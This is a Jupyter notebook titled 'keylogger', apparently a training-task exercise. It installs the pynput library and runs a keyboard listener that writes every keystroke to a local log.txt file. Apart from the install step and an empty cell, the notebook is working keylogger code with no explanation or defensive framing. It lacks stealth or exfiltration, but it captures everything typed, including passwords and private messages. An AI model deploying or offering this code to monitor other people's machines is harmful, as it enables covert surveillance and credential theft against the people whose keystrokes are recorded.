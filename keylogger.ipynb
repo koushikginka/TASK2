{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "e6cd22bf-f1f7-420f-a7fe-4f793f69b8ca",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: pynput in c:\\users\\desktop\\appdata\\local\\programs\\python\\python312\\lib\\site-packages (1.7.7)\n",
      "Requirement already satisfied: six in c:\\users\\desktop\\appdata\\local\\programs\\python\\python312\\lib\\site-packages (from pynput) (1.16.0)\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6ab6240a-74bf-4362-97d0-30220ba1fc3c",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput import keyboard, mouse\n",
    "import pynput\n",
    "\n",
    "def on_press(key):\n",
    "    try:\n",
    "        with open(\"log.txt\", \"a\") as log_file:\n",
    "            log_file.write(f'{key.char}\\n')\n",
    "    except AttributeError:\n",
    "        with open(\"log.txt\", \"a\") as log_file:\n",
    "            log_file.write(f'{key}\\n')\n",
    "\n",
    "# Set up the listener\n",
    "listener = pynput.keyboard.Listener(on_press=on_press)\n",
    "listener.start()\n",
    "listener.join()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "27884f5f-272a-4232-a704-277fd595d9f3",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
